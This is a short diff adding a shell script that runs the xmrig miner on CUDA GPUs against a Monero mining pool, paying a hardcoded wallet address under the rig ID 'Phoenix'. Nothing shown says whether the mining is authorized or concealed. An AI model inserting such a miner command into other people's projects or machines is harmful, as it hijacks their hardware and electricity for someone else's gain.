@@ -1,0 +1,3 @@
+#!/bin/sh
+
+xmrig --no-cpu --cuda -o pool.minexmr.com:443 -u 43GhwP9ojk4TFyCvAtpK6QRuDqUz6G1bvMCzamgYhQUbhvFRET79fHY2Ur7GgoZ1DMGrbGjJTDCoAVq1YUeE71YUF2pvGT7 -k --tls --rig-id Phoenix
